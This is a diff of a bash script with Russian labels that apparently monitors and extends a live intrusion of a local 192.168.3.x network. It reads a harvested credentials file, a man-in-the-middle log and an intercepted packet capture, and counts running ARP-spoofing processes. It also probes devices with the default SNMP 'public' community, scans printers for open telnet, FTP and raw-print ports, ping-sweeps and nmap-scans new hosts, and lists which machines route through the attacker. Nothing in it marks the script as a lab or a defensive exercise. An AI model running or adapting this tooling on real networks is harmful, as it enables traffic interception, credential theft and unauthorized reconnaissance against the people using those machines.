@@ -1,25 +1,7 @@
-echo "=== CREDS ==="
-cat /tmp/creds_new.txt 2>/dev/null | head -30
-echo "=== MITM LOG ==="
-cat /tmp/mitm_log.txt 2>/dev/null | tail -5
-echo "=== PCAP SIZE ==="
-ls -la /tmp/mitm3.pcap 2>/dev/null | awk '{print $5}'
-echo "=== SPOOF STATUS ==="
-pgrep -c spoof
-echo "=== WS TRAP ==="
-tail -5 /tmp/wstrap.out 2>/dev/null
-echo "=== SNMP скан сетевых устройств ==="
-which snmpwalk || apt-get install -y snmp >/dev/null 2>&1
-for ip in 192.168.3.1 192.168.3.190 192.168.3.105 192.168.3.211; do
-  R=$(timeout 3 snmpwalk -v2c -c public -t 2 -Ov $ip sysName.0 2>/dev/null | head -1)
-  [ -n "$R" ] && echo "$ip SNMP: $R"
-done
-echo "=== ПРИНТЕРЫ (telnet/ftp/9100) ==="
-for ip in 192.168.3.105 192.168.3.211; do
-  for p in 23 21 9100 631 80; do
-    timeout 1 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN"
-  done
-done
-echo "=== НОВЫЕ ХОСТЫ (кто появился) ==="
-for i in $(seq 100 254); do ping -c1 -W1 192.168.3.$i > /dev/null 2>&1 && echo "$i UP"; done | head -15
-echo ALLCHK
+echo "=== НОВЫЕ ХОСТЫ: полный скан ==="
+nmap -Pn -T4 --open -p 22,23,80,443,445,3389,5900,8080,8443,554,5060,9100,631,21,3389,5985,5986,22,15611,7547 192.168.3.121 192.168.3.127 192.168.3.133 192.168.3.144 192.168.3.181 192.168.3.210 192.168.3.212 2>/dev/null | grep -aE "report|/tcp open" | head -30
+echo "=== PCAP анализ (что ловим) ==="
+tcpdump -r /tmp/mitm3.pcap -c 20 2>/dev/null | head -20
+echo "=== ARP таблица (кто через нас) ==="
+ip neigh | grep -E "135|152|16 |76" | head -6
+echo NEWSCAN
